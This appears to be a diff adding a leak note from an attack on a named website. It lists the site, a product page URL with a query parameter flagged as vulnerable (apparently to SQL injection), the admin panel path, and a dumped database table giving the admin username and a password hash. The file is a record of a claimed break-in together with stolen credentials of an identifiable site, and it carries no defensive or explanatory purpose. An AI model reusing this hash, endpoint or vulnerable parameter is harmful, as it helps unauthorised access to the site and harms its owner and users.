@@ -1,0 +1,9 @@
+Web-site:https/www.tmpower.net
+vulnerability: httpswww.tmpower.net/product.phpcg_id=5
+Admin-panel:https/www.tmpower.net/admin
+Dumped:
++----+--------+----------------------------------+
+| id | user   | pass                             |
++----+--------+----------------------------------+
+| 1  | admin  | 033766688d73f3611a3f3caff4fc45cf |
++----+--------+----------------------------------+
